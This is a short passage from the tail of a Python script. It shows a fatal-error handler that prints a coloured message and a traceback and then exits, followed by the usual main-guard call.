        print(f"\n{Colors.ERROR}❌ Fatal error: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()